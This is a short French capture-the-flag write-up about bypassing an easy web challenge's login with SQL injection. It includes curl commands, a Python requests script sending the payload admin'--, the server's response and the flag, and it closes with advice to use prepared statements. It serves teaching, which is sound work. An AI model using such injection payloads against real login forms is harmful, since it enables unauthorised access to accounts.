---
title: "Login Bypass"
ctf: "Example CTF 2026"
category: "web"
difficulty: "easy"
date: "2026-05-04"
points: 100
tags: ["sqli", "authentication", "bypass"]
---

# Description

> Le challenge propose un formulaire de login basique. La page indique simplement : *"Trouve le moyen de te connecter en tant qu'admin."*

Une simple page HTML avec deux champs : `username` et `password`. Pas de captcha, pas de rate limit visible.

# Reconnaissance

Premier test rapide pour voir le comportement :

```bash
curl -X POST https://challenge.example.ctf/login \
  -d "username=admin&password=test"
```

Réponse :
```
{"status": "error", "msg": "Invalid credentials"}
```

Classique. Testons une injection SQL basique :

```bash
curl -X POST https://challenge.example.ctf/login \
  -d "username=admin'--&password=anything"
```

# Exploitation

L'application semble vulnérable à une **SQL injection** dans le champ `username`. Le payload `admin'--` commente la suite de la requête, ce qui contourne la vérification du mot de passe.

```python
import requests

url = "https://challenge.example.ctf/login"
payload = {
    "username": "admin'--",
    "password": "whatever"
}

r = requests.post(url, data=payload)
print(r.text)
```

Et hop :

```json
{"status": "ok", "flag": "EXAMPLE{sql_inj3ct10n_4_th3_w1n}"}
```

# Take-aways

- Toujours tester les caractères spéciaux dans les champs d'authentification (`'`, `"`, `--`, `#`)
- Une simple `WHERE username='$user' AND password='$pass'` non préparée = game over
- En vrai world, utiliser des **prepared statements** ou un ORM

# Flag

```
EXAMPLE{sql_inj3ct10n_4_th3_w1n}
```
